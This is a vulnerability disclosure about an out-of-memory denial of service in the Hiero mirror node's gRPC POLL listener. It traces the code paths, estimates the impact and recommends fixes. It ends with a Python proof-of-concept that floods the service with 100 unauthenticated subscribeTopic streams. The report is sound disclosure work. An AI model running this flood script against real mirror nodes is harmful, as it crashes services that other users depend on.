### Title
Unbounded Concurrent Subscriptions with Full Result-Set Materialization in PollingTopicListener Enables JVM OOM DoS

### Summary
When the gRPC listener is configured with `type=POLL`, `PollingTopicListener.poll()` creates an independent per-subscription DB query every 500 ms, capped at `maxPageSize=5000` rows. The repository implementation materializes the entire result set into a Java `List` in JVM heap before returning a stream. Because there is no global subscription limit and no authentication, an attacker opening many connections can drive concurrent heap allocations to exhaust JVM memory and crash the mirror node process.

### Finding Description

**Code path 1 — uncapped page size per subscription:**

`grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java`, lines 54–61:
```java
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getCount().get())
        : Integer.MAX_VALUE;
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize()); // caps at 5000
...
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```
When no client-supplied limit is set, `limit` is `Integer.MAX_VALUE`, so `pageSize` is always the full `maxPageSize` (default 5000). This repeats every 500 ms per subscription.

**Code path 2 — full result-set materialization:**

`grpc/src/main/java/org/hiero/mirror/grpc/repository/TopicMessageRepositoryCustomImpl.java`, line 60:
```java
return typedQuery.getResultList().stream(); // getResultStream()'s cursor doesn't work with reactive streams
```
`getResultList()` fetches all matching rows into a `java.util.List<TopicMessage>` in JVM heap before the reactive pipeline consumes a single element. Each concurrent poll for 5000 rows allocates a full list in heap simultaneously.

**Code path 3 — no global subscription limit:**

`grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, lines 48, 89–90:
```java
private final AtomicLong subscriberCount = new AtomicLong(0L);
...
.doOnSubscribe(s -> subscriberCount.incrementAndGet())
.doFinally(s -> subscriberCount.decrementAndGet())
```
`subscriberCount` is a Micrometer gauge only — it is never checked against a maximum before accepting a new subscription. The GraphQL contract-log subscription has a `maxActiveSubscriptions` guard; the gRPC POLL listener has none.

**Code path 4 — per-connection limit is bypassable:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, line 14:
```java
private int maxConcurrentCallsPerConnection = 5;
```
This limits calls per TCP connection, not total connections. An attacker opens `C` connections × 5 subscriptions = `5C` total subscriptions, all polling independently.

**Root cause:** The design assumes a small, bounded number of POLL-type subscribers. No global cap enforces that assumption, and the full-list materialization means heap pressure scales linearly with concurrent active polls.

### Impact Explanation
Each concurrent poll allocates a `List<TopicMessage>` of up to 5000 objects in JVM heap. A `TopicMessage` carries byte arrays (message body, running hash) and several long fields; a realistic size is ~2–6 KB per object, so 5000 objects ≈ 10–30 MB per concurrent poll. With 50 concurrent subscriptions all firing simultaneously (10 connections × 5 calls each), the JVM faces 500 MB–1.5 GB of transient heap pressure per poll cycle, repeating every 500 ms. This drives the JVM to continuous GC pressure and eventual `OutOfMemoryError`, crashing the gRPC mirror node process. The DB also receives 50 concurrent `SELECT … LIMIT 5000` queries every 500 ms, exhausting the HikariCP connection pool and stressing PostgreSQL `work_mem`. Crashing enough mirror node instances satisfies the ≥30% network processing node shutdown threshold.

### Likelihood Explanation
**Preconditions:**
1. The deployment must use `hiero.mirror.grpc.listener.type=POLL` (not the default `REDIS`). This is a documented, supported option and is used in environments without Redis.
2. The targeted topic must have ≥5000 messages in the DB (trivially satisfied on mainnet/testnet).
3. No external rate limiter (WAF, load-balancer connection limit) is in front of port 5600.

**Feasibility:** No authentication is required. A single attacker machine can open dozens of TCP connections to port 5600 and issue `subscribeTopic` RPCs with `startTime=0` and no limit. The gRPC protocol multiplexes streams over HTTP/2, making this cheap. The attack is repeatable and self-sustaining as long as connections remain open.

### Recommendation
1. **Add a global subscription limit** in `TopicMessageServiceImpl.subscribeTopic()`: check `subscriberCount` against a configurable `maxActiveSubscriptions` property and return `RESOURCE_EXHAUSTED` if exceeded — mirroring the pattern already used in the GraphQL contract-log subscription.
2. **Replace `getResultList()` with a cursor/scroll approach** in `TopicMessageRepositoryCustomImpl.findByFilter()` to avoid materializing the full page in heap. Use Hibernate's `ScrollableResults` with `FORWARD_ONLY` scroll mode, or switch to a JDBC `Stream` with `fetchSize` set.
3. **Enforce a per-IP or per-connection subscription rate limit** at the gRPC interceptor layer, similar to the `ThrottleConfiguration` used in the web3 module.
4. **Lower the default `maxPageSize`** for the POLL listener or add a hard upper bound (`@Max`) in `ListenerProperties`.

### Proof of Concept
```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto import timestamp_pb2, basic_types_pb2

TARGET = "mirror-node-grpc:5600"
CONNECTIONS = 20   # 20 connections × 5 streams = 100 concurrent subscriptions
STREAMS_PER_CONN = 5

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
        # no limit → Integer.MAX_VALUE in poll(), always fetches maxPageSize=5000
    )
    streams = [stub.subscribeTopic(query) for _ in range(STREAMS_PER_CONN)]
    # keep streams alive to sustain polling pressure
    for s in streams:
        threading.Thread(target=lambda st=s: list(st), daemon=True).start()

threads = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# Expected: mirror node JVM OOM / process crash within seconds to minutes
# depending on heap size and topic message count
```

**Observable result:** JVM heap exhaustion (`java.lang.OutOfMemoryError: Java heap space`) in the gRPC process, or sustained GC pauses causing liveness probe failures and pod restart in Kubernetes, effectively taking the mirror node offline.
